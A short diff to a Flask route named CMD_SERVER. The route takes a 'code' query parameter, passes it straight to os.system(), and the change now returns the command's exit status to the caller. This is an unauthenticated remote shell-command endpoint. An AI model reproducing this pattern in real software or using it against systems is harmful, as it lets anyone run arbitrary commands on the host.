@@ -70,9 +70,10 @@ def CMD_SERVER():
     url = request.args.get('code')
     if not url:
         return jsonify({"status": "error"}), 200
-    os.system(url)
+    commond = os.system(url)
+    print(commond)
     msg = {}
-    msg['msg'] = 'CMD'
+    msg['msg'] = commond
     return jsonify(msg),200
 
 @app.route('/setup')
